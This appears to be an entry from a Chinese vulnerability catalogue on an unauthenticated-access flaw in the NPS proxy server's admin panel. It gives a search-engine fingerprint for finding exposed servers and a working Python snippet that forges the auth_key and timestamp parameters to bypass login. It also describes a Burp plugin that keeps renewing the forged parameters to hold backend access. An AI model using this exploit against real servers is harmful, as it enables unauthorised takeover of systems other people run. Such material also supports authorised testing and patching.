# npsauth_key未授权访问漏洞

- **系统**：npsauth_key　|　**类型**：未授权访问　|　**CVE**：—
- **指纹**：`hunter：`app.name=="NPS"`\`

**请求体 / payload**
```
nps认证方式是通过配置文件nps.conf中的auth\_key与timestamp的md5形式进行认证，但在默认的配置文件中，auth\_key 默认被注释，所以只需要可以获取到的参数 timestamp 就可以绕过认证登录。
import time
import hashlib
now = time.time()
m = hashlib.md5()
m.update(str(int(now)).encode("utf8"))
auth_key = m.hexdigest()
print("Index/Index?auth_key=%s&timestamp=%s" % (auth_key,int(now)))

成功绕过进入后台\

NPS存在一个身份验证的缺陷，无需登录，直接进后台，后台功能点全都可以用。具体利用是伪造两个参数auth\_key、timestamp。由于参数的生命周期只有20秒，20秒过后就需要重新伪造，故采用burp插件。\
插件所有的功能集成到了Burp的右键中：\
1、首先访问nps站点，拦截请求包，启用插件\

2、点击“查看仪表盘”会修改请求包，之后直接放行数据包成功登陆后台，后续每一个请求都会自动贴上身份验证参数。\

```

**其他**
- nps auth\_key未授权访问漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * nps